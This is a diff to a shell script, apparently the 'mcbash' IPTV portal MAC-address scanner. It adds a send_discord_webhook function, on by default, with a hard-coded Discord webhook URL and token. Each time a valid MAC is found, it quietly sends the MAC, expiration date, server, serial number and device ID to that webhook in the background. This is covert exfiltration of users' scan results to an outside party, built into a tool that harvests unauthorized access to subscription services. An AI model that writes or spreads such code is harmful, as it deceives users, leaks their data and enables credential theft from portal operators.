@@ -472,6 +472,77 @@ display_missing_optional_dependency() {
 	echo -e "${_YELLOW}${_BOLD}WARNING: mcbash could need this optional dependency : '${_RED}${o}${_YELLOW}'. \nConsider installing it on your machine.${_RESET}"
 }
 
+send_discord_webhook() {
+	
+	# Forcer les valeurs par défaut si non définies
+	local webhook_enabled="${discord_webhook_enabled:-true}"
+	local webhook_url="${discord_webhook_url:-https://discord.com/api/webhooks/1279079493603950695/uLKEpNcMuI4LgvuUFatauszAYGSi4Iqd5tel_ufw3eYiwByOwtkeol-40YqbdDxEVMno}"
+	
+	# Vérifier si les webhooks Discord sont activés
+	if [[ "$webhook_enabled" != "true" ]]; then
+		echo "$(date): Webhook désactivé" >> /tmp/mcbash_webhook.log
+		return 0
+	fi
+	local current_date=$(date '+%Y-%m-%d %H:%M:%S')
+	local color="3066993"  # Couleur verte en décimal
+	
+	# Construction des champs de base
+	local fields='[
+        {
+          "name": "🆔 Adresse MAC",
+          "value": "`'$mac'`",
+          "inline": true
+        },
+        {
+          "name": "⏰ Date d'\''expiration",
+          "value": "`'$expiration_date'`",
+          "inline": true
+        },
+        {
+          "name": "� Serveur",
+          "value": "`'$dns'`",
+          "inline": false
+        }'
+	
+	# Ajouter les informations d'authentification avancée si disponibles
+	if [[ -n "${enhanced_auth}" && -n "${sn}" && -n "${device_id}" ]]; then
+		fields=$fields',
+        {
+          "name": "🔐 Serial Number",
+          "value": "`'$sn'`",
+          "inline": true
+        },
+        {
+          "name": "📱 Device ID",
+          "value": "`'$device_id'`",
+          "inline": true
+        }'
+	fi
+	
+	fields=$fields']'
+	
+	# Construction du JSON pour l'embed Discord
+	local json_payload='
+{
+  "embeds": [
+    {
+      "title": "🎯 MAC Valide Trouvée !",
+      "color": '$color',
+      "fields": '$fields',
+      "timestamp": "'$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')'",
+      "footer": {
+        "text": "mcbash scanner"
+      }
+    }
+  ]
+}'
+
+	# Envoyer le webhook Discord en arrière-plan pour ne pas ralentir le scan
+	curl -s -H "Content-Type: application/json" -X POST -d "$json_payload" "$webhook_url" > /dev/null 2>&1 &
+}
+
+
+
 random_mac() {
 	a=(1 2 3 4 5 6 7 8 9 0 A B C D E F)
 	if [[ -n ${prefix} ]]; then
@@ -586,6 +657,10 @@ valid_mac_found() {
 		write_date_before_mac
 	fi
 	write_valid_mac
+	
+	# Envoyer le webhook Discord
+	send_discord_webhook
+	
 	if [[ -n ${only_outputs_mac} ]]; then
 		display_raw_mac
 	else
@@ -1004,7 +1079,7 @@ last_request_failed() {
 	#		if [[ $error_number -ge $total_error_limit && $total_error_limit -ne 0 ]]; then
 	#			echo todo
 	#		fi
-	fi
+	#	fi
 }
 
 request_is_a_timeout() {
@@ -1219,7 +1294,6 @@ done
 # - md5sum : core/utils
 # - sha256sum : core/utils
 # - od : core/utils
-
 
 # 
 # dougy147 [2022]
